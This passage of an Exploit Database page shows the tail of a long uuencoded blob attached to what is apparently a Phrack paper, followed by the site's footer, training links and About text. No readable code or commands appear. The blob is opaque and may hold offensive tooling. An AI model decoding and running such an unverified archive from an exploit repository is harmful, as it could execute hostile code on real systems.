M&gt;4+3R-49]!.C2&lt;)5KXS_*Q23(63,P@P:ETF0NH47Y(&lt;HP*!+BU(%8DXDKMM4
M\DI&amp;I&lt;TUJ-F&quot;EA:9B_M\R%PZL\0@7?]-&lt;9OZ%#F99*RL*I.:,0J9^AX:&amp;_Y&quot;
MZV%^3M,`QX];[M%&quot;1)$^AZ8:;+O3I4&lt;X??E6/CZ.HH_S656M@LU,^9L\-CH*
M4N2BLD&amp;/+3YN-6:3^7NM,1UB_[^PJ&lt;@&amp;^5[`FQ.GE6?92;-NR!0_MUW&gt;U&quot;Y8
M$^&quot;?C\T3[;39?[&#039;7./_I8&#039;$7DC?&quot;C]^DIKU`(L&#039;3&#039;ZWD.F\$/B90X(D&amp;%QW)
M%5PH3CB^DK*&#039;(#6#QM2IKN[M6._8[V&lt;ZS4B)@Y^&lt;/AJ=GP+9Y2$`OS+#G52O
MM$#&quot;,FF3I@&lt;^2C=J4MKX4#68N_/!VUV&lt;%%_?&gt;I:84,XRR&#039;\I*&lt;N8I3[RI01)
M=5V7MRG73195USF+Q$B#+\&#039;$*EE,9:*&gt;N.NJ$4N5:*TSHIJ^YQ,X&#039;&#039;WD:OI&lt;
M9?G\V=9*^D,#YKDJ0VME*K]3&lt;@UJPT#5O&quot;8L?&amp;:#@&quot;9NL^-?@Q];/XHNLIL^
MNK@A+T&lt;?&quot;O#_2G@@(-_[-!^#NS`%@&lt;[5!5S,P&gt;,FB,&amp;Y9AHQ%A`-O6L?_&gt;L_
M3J-K\,R&quot;U]YU0*K&#039;8!@,O&gt;H-P\UBU8`&lt;]8+M66VR_32B6G7/L1T7;\%:*S&gt;@
MH&amp;&amp;O7KQ^L?_ZY?[N:SS7&#039;T01X!5L.V,_87V13]I&#039;^&gt;;(&#039;R&gt;HL.+R@KRU4%HN
MR_#OG2PKK;KULO+ANSSR,VBOKGHD(04O/HP.:W5#/+&amp;@)G;*S=V][W9W&lt;QE(
M-X(XE8`AU^#*?!U&#039;\!7&quot;?R7@*,-^1//88_UZW;,N&quot;7N.L]KVMH/&#039;&#039;+8./OQ$
MO?S/&#039;&quot;0)Z$&quot;VLEXK&quot;P@).0T0\EDY(!0ST7(P:!^&gt;JY$O,V59T?-&#039;?HB&#039;&gt;[=6
M4&quot;@$G_Q[EO?_N7I@_Y\=)J&#039;M9_Q_7NT\^?\\C/_/!!.J%+O_J!AC_9_;AZT.
MA(7M0#&quot;T]WT58RS[&quot;CY67I[,GA7@I6B1JCHC!RZCHF:&lt;P*&amp;/?X=#6X&#039;N_=V=
M[X3?K6Z?=V_O[W1/S&gt;PB,5&#039;CB0O^&gt;_-_[J9W;WTLX/_LQVN+_^^^&gt;O&#039;D__D@
M&#039;YVU?^BUC[LF2Y&gt;/Y+/L@8S]4U-9X_&#039;G.[B-X,HI9+4&amp;&quot;Q*-/K&amp;&gt;QT&#039;_)_[&#039;
M`**`?&quot;&#039;ZW]U_9&lt;M_NZ]?O7JB_X?XM#O=?O?P+R+5E??#6K/9/VBS+]Y_5).K
M8#SV/@_B^=3;W$R&amp;&#039;[UP=A5-@RAA/S%(X`#&quot;[G[[;6WMKV@R&gt;-;HO3=J,DEF
MDS(EL!JSF(DGFY#KOK;&amp;^\7&quot;JFYM6\052;;#,^BJT]V:\4?;A\&amp;G8`RW;]NL
MIBKP&#039;U5K$K4M-M2USL%_=EGS5X&#039;/)+%9[-]L19I]-.UYD0&lt;^ZY$I&gt;6U%:P2`
MX&lt;N7.SO]631@,,&amp;!$FAJWN;(VX2(&#039;9X?3U[M&gt;YMA&lt;I-@A!4Y%%:F&lt;_$_36_S
M%X@&#039;O=G&gt;6EMC7]ZR`C`L=G&quot;&amp;QEBARVFT&quot;?%6!NFF/PY]5#!M_L(&gt;\OOV_Y/)
M^+LY$6NP^8E&quot;&lt;;`GTQ^^V]H1C3LJ3=AI&gt;6OB;4:L#,[`T&gt;Z1&amp;OQV%^-O;Q^&#039;
M%[$?WVSC#&lt;AU%&#039;],6,5*A8UX.`XO?F#_#;[]EAY=BB+&gt;$2C+Z+K*&gt;H-Q4&gt;V&#039;
M$`_@)!B&amp;ONL%&#039;@KL%_KA)-N%N)YPS-`&gt;R&gt;:8[5(#4B&quot;`^H`!*+X4$*)_MH;=
M7T_DJJU]X[4Z1VO_:OR?L./^^EC`__?W=_9L_K^_]^*)_S](_@&gt;,$L89!(\9
MYM$U#8;?;@S]&quot;3V3&lt;&lt;[_W__U]G9VWWC_&#039;4X8+P[GDYR4$-N8T%&lt;J&amp;#ZT(&lt;L(
M_J6((OSY++V&quot;^VRN9A&quot;A0W!`Q=%%&quot;B*1:$P?HH^X+P.64__+:_J)/YNA)O-2
M#T`?#!7OJ0/@S&#039;=T0%_R3EYI`$K&lt;HB.[&lt;ROQR4\MHT-0]B&amp;_&amp;;QRRV5R0K=U
M1C&amp;W,2#=;KZC\6A:7!KI6V_G\Y]V/J\+_7*-%Z3Q5HT$4+5&quot;M&lt;PSI4`I=U4;
MN,RH;%NQP@M;-=`\3&lt;TSJ941&amp;AE3$:.NX.@&amp;NUAO9$VQS`T7?8+/LW$4IC9&gt;
MRZ4#&lt;Q5_D,[]L1=,,&gt;8]6&quot;%*#.?5#6PU=E+#8)[-%&gt;ZQKL,$`R!R,(.93&#039;42
M):DW#C\&amp;8XC^IB\MQWCHE?=6E4ALE.0`_TOK_+3?_=!LMKI=@H:#),C:PG@9
M&lt;CLTM72*-?0AR4)5PQ^]$WG%L0&quot;?,%$#$]W^B8@$S2Z!1MI88!=*Z3MKZ?:C
M$BUXESX[T0U+#4:C4F!\4+O3.1!5V5)7&quot;8P,FM\S&amp;C\Y:)WW.T=L3.=&#039;#3:J
M?J_3[YZ=-WY]YWW[;5C3QF4LC3;94&lt;&quot;G&amp;@S[JDPUU`:KC0DZ_].P;K:&amp;-V&gt;A
M15_2#9*!K5HM&amp;&amp;EMX\U.;7MW9\?[_@&lt;OK,F*)B.D15+4K3/?G&lt;_[N_0_K=_?
MO6&quot;&lt;!,NTHE&lt;VAF_&gt;L[G&#039;E[%&gt;N,ZN7O[BJSY_SV)!E`:B%8UK0;&amp;%.,L6%VQ&#039;
MQ4^M/&amp;^GZN9GR`Q@VU^6$^@##\:#B-^(*MA+#J.&gt;:AT_Z7](UOIB\C^H&gt;S+R
M/_OG2?Y_6/WO2:-]:FA_Q0-SGX8++^M2B1=\TN=^G?0/)ZM[//Z7H/_,^7_O
MY=X3_3_(^9\G80S1E7;,!).K:`S&gt;$&gt;(P@,=N#!(.,20HVTDTF85@ZWX=39^G
M[$AUL_5$^E\Y_5]]0?I_O;.;I?^G_*\/\E&amp;!&gt;2$4_#;\,;1S2IN_K;Y:)D%,
M]#9OC?D#^01^@WR&gt;0O29RTE:][:VMFK&gt;:?&lt;X&amp;E6K?U[_VY\&amp;?_?^E+QE__?6
MH0#$`H.R_?[E?#KH]^L8J+Z/1^X^Q:=&#039;;4_=^^:;?O_G1K]Q_E.WWZ_AJ&amp;!0
MIW@HD`-01P39NWRG3E&#039;:.SC&#039;%=664WK^[7,^)6LD!&lt;VKRIMYE:5L11-!98E^
MA4X07D&amp;,=:!_^U9L\J#TO[NWE[G_??%Z9_^)_A^4_M=M+&quot;@;VEN/&#039;;7AC?J,
M1?C*(=JM&gt;K?ZZ@NC$OXTJY#GQB7H12_U[+8ZW5`7&lt;`VCJ4)8T&amp;\UC/J#:#H-
M!FD?DE&#039;A-U3G.K2-8!I]&amp;0&lt;!MY]?K*N0H1=-3994[M&gt;R;2O#;LAQA&lt;,!?_63
M(+V*AE5M@&amp;L5\``C-5&gt;_]=&lt;&gt;Z[AQW#]I]=YW#OOGK&gt;-6H]LBUQA-^[0K/9&gt;]
M&#039;?=7Z3OC5$*Z76@(IJ@.Y5&gt;Q[4/;4TS&quot;SNU4DV_270Z=Q%5!&#039;C;)&amp;`\:,N5$
M_S&amp;756;SI@MD&lt;/D$)U!TV&amp;P,AZ%P^ZSS0ET%@&gt;MP/(8DWM16,&#039;2$A(&quot;@2:70
MUIQ?&quot;:S=T&amp;&#039;/NI3.F]Q&#039;B&#039;OVS-*X/#:#D@^\S?X&amp;L9)W,&amp;C);SL4W@K&gt;&amp;&quot;W_
M32&#039;G8;L)B:0;Y[]B@&quot;E9K&lt;+=(\T1H3?D#\);P7A&#039;;M)I/)C=5-F3NK?^/3C5
M_HA.!?#&lt;3\7SC\&#039;-CW(Q?@F&#039;Z=7WV_#,412B,8R&quot;^$&lt;VI&gt;^WQ8]%3;X/X.YS
MM6VV*&quot;5&gt;Z::7;KDL&#039;,HW##F[DK,@YAV4@&lt;&lt;2K6L.G`M;?O/ZY9L7KU[NOBG?
M?#OY:1Q=^./&lt;MM-X&#039;FPO;`8CSD(B&#039;FI&#039;CNC%R[V]EZ_*#Z?)Y-W@)!K:[60;
MV=XN:.8TFI[-XU$`@3EY2Y?@C[5=HNX9XS(PFS-_%&quot;2\L@:$174OX1[`71?=
M!KTN7!_P=-LJY3FPOT(T@/+@;9V[4.@&#039;2OU`-YAGE&#039;&gt;3;;L4R\`^-7I1&amp;+P$
M^D(;.C6K)5VR$2&gt;9W7I(!V$*C:%&#039;[QV;RC*6NS;EA-?N+&gt;%U&#039;ET7M[1FM[4M
ML8,0-F&quot;;Z_&quot;^4&amp;EG%;BTU!;SA$TKQ::]%\NA4TOB4B&#039;WVS;XV7:&quot;5K27\-;[
M%KRJQL$4?M2R6Q&#039;EN;1&amp;N?/Y3^/Q9VVD=7YFRTY&gt;&#039;^_=3R&#039;-\U:CU]*#)&gt;WP
MF`;H]:\FPJ:E3B:BK&quot;&#039;Z*&gt;=V34R\S5E%6@-)H.7Z^6^8$C0&amp;2Q+R]4;-%$W9
M#!0&lt;Q+_MPW[GZ*C;Z@E7VJSL3:.&lt;!!.0:3.OZYX%!*=4S/WR&quot;_UBRYVBP$I#
M+6[V%-6Y2/UP&quot;O&lt;&amp;JA1XM^NGJG.PBBYSLKJ,HPD&gt;FN!QP$Y5C&lt;$@@*@[3%J)
M7`&lt;EO*&quot;`A*O:X0?/3L5&#039;)W-2YM$)H_I.874I4FN)0U#.T8O&#039;?4&amp;E)&gt;A1^V#9
MD*2PCJ!5Y4$RHW[(&#039;D$8&gt;AAH&amp;JOG/,\L&amp;NE14FXR8Q)T&gt;!4E*4Z%E:6&amp;J]@7
M/D^&quot;\665L8-G6I&lt;&quot;YTK1QA&amp;:#LF0+]2,!\TLB((A&lt;XC_%%!F=U:=/TFJVFCJ
MGIDZ&#039;M2YBF`HE62W=?YSN]F&quot;&gt;3#0W&amp;W\U(7,WIL[B^LKB,/&gt;[K3YLK23GR&#039;B
M;A4&amp;X#U[!D%RQ6JH0J?!YQ1+U/#L;(.B,V-LC=?C:NS43S[*58(0+0IQ&lt;&amp;3Y
M$Z586*PXFQA$`&gt;7AKLQ(/IR=$UBD/FZ&quot;LGR5#NL;&gt;]ZFM[LC&gt;Y-5J`/&amp;@9(@
MY4_)UJGNR:HU5?=W4UWC6*,?]#7:$/3%QJ/FK`4A#B435.3PNQ7&lt;8^WWIUN[
MU=[_932_#WO_M_MR_W56__]T__=`]_]KE&lt;99&amp;W?3&quot;S\)!W&quot;[/YE/&gt;;(3TG@:
MV_D&#039;QLR:XY#)TQAX)_&lt;&quot;43S.O4%415&quot;;NHU_C\,+O%U4]XMJ8\CXISI&gt;.=X9
M^XF&gt;1W3=F-=ZS579+&lt;7*)G9J)&gt;IP_;NLM.OLR5*,:N/&lt;^7S0?./J*&quot;-:&gt;BO\
M(+]G(UV-0/7NRZBT%_:[DAL@PQHNBY2/V3@&amp;^+_F+7,O9F&quot;+[G]?[-OYG_=&gt;
M[3_%?WG@^U_39ZK@ZM=Q4;QX%Y&quot;/R8@C[R6&lt;#O+&gt;I&gt;$DR&#039;T7^[/$\5*T)YDG
ML%9P`V@&lt;&#039;W&gt;:BI-7(=$DP\6:O,\V&amp;,%(NBG`,Q),&gt;3G]C#?J3Y(1_DC^IKP/
M.@?_V6KVE/.!O/+B+4C.,M*&lt;(?0&amp;,NX+ZJXMYRBO&amp;=VCV,]#-0##N@CZT:&lt;@
M1G\$QZ&amp;&gt;9\SCF34&quot;&#039;@^1G:;8S#QV/AI&lt;&gt;&lt;E5-!\/O&gt;`3$P&#039;F&amp;.3V(O&quot;@S&lt;MQ
M=#TM&lt;RG/&#039;=U,SEQVS%4M;T[=`/^&amp;)\!?^A93/Z/_(TI8*?:79^+9$O-GOU$A
MM34.IOPRDN?%494!\*SVE&amp;+5G32:[_MGG?-&gt;7\2%I\Y5&gt;0&#039;8_N5\/*YFCH6L
M-]7&amp;&gt;?NG]^QOJ]EJ_]PR7PGUV#,V;/P7!K&quot;&lt;)LQ8951/B&quot;&quot;8#)^4%Y%;*28`
M#LZ&amp;%)%OV;M[;=DOP_&amp;X#[^S:&#039;G$7B6H&#039;X+W))42?L!3/Q5(R3$1,(6ARI8C
M/G.(+JJS:)J$%^,`Y5X&lt;,B@(YC.=A+UPRBHE`7AZ`ASF&lt;;`*Y):SK&quot;YG.6+X
MLU5RO;)L;B.=LH1FHC2=V:RR[CVKZAPN_&#039;NME+HBHW65/FHF@PD2C!%/GEW8
MLHURMKZA7-!/%^R-&amp;*I)(;Y%8\8,KP/2%;-Q4CA#7I.0#VT[1N&amp;GP)LGX#9%
MWEZWPCYM![AO_#-A&lt;`=L)(,/,7+0&amp;96P]\`K$+&#039;;:/&quot;,P-9\K(&amp;&gt;00%^,%SY
M%$;SA&amp;TW(&#039;,/)?G#C&lt;DM?!0%.2PXB)@[/Y&amp;`ODLS(J@;4[\C20B;J054(%1T
M*@N#,0:,C;Q1G3,T&amp;X&amp;M$5LPJ\BW[&#039;2W+RX+[L&quot;SAY*&quot;I4&lt;G7Y@L41W*LIX_
MO9$+.&amp;&amp;=I[#P%T`_`7G:(YN?,,*8S&lt;&gt;D,&lt;A/R\8Q&#039;L]_I88F&lt;/U.;#7\]EO&quot;
M(U*@&amp;GQ1*E+E?@]Y8N/H)KO3&gt;U956G&#039;C&amp;:&lt;RH&gt;N]%;+3(&quot;W,%&lt;-&lt;=&quot;BVB2#3
M$!^T^=08=E&amp;&quot;IER7TBP*H&lt;U((LEE&gt;0O0`O?5\C)C9B/5]O1W2U]&quot;0F4@?:B_
MX(*E#!N_PP!HJ]/WM_6%%IIF_I&quot;2Y.=0ZY?B-KS;HH2.P%G8%HOI6HF=\&amp;`&lt;
MR%$DGYU$P_DX6)3KT&gt;6\3&amp;A2?J(FY0$!&lt;5C)*Z+F.$IL(B.X.XZ=1$L+(:6[
MV.MB%C&quot;6+/A^&quot;E*2=E&quot;6YY%-G-(9;]-C4@\[(&quot;8BODDX&#039;0:?;6AJ9S,.5/VT
M5G*P*O8)]E&#039;V9I;?)T$5[\&lt;?&quot;AAYEBA&quot;RK-)_;&#039;&amp;_S%GO%L&lt;@CC*6A=3!K^&amp;
M:G]_5Y;CN6,A%&quot;Q1^U&quot;&amp;GN&amp;R@K$F*N:,&lt;TTD-/W$:$/BO2RP.%[#[58F;V&amp;R
M01I6LS+&amp;IJ2OS&lt;*E`9N&lt;[$*T1&lt;0/QBL53V$$PJ3@:9A,DCMM2A239-FM:(%2
M_EF6MRRY11AA3DQS#^L29;G]PLD&lt;22A9S![=_-&amp;5`&gt;KIGK&gt;D_O_JX?7_.[N[
M.SL9_?]3_(&gt;&#039;^12H[H5[Y_M6XXPXLNGE:3Z7+_*W6M*TO]#N3`NX/Q6NYK?F
M;7M[-?RS5E[(Y\$KBMDO+Y0G`?+7M]\HWZU&quot;#GI&#039;(NI&amp;IC[OE@=G=D&gt;$=]8$
ENS-&gt;&quot;(*9RD`?AN.IL&gt;A/7O]/GZ?/T^?I\]5^_C\`W);&#039;`#`&quot;````
`
end

--[ EOF
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="http://phrack.org/papers/viewer_discretion_advised.html" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/45609" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/45870" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
                                 alt="Offensive Security">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
                        that provides various <a
                                href="https://www.offensive-security.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offensive-security.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by Offensive Security.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">Offensive Security Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

